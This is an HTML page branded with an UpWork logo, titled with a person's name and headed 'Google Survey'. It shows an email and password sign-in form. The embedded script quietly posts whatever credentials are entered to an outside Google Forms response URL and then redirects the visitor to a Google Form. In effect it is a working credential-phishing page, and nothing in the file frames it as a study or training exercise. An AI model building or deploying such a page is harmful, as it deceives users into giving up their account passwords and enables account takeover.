<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UpWork- Ranjitha Ranganath</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #f4f4f4;
        }

        form {
            display: inline-block;
            text-align: left;
        }

        label, input {
            display: block;
            margin: 10px 0;
        }

        input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
        <h1>Google Survey</h1>
        <form id="login-form">
            <label for="email">Email</label>
            <input type="text" id="email" name="email" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent form submission

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // Validate if both fields are filled
            if (email && password) {
                // Prepare the data to be sent to Google Forms
                var formData = new FormData();
                formData.append('entry.123456', email); // Replace with your form field ID for email
                formData.append('entry.7891011', password); // Replace with your form field ID for password

                // Send data to Google Form (use your actual form's action URL)
                fetch('https://docs.google.com/forms/d/e/1FAIpQLSeP8xFZtoLZKBgwW9RYQyBOIu5UlRkh8PjbSoq9wLXcnFW9PQ/formResponse', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    if (response.ok) {
                        // Redirect to your desired Google Form after submission
                        window.location.href = 'https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit';
                    } else {
                        alert('Error submitting form.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            } else {
                alert('Please fill in both email and password fields.');
            }
        });
    </script>
</body>
</html>
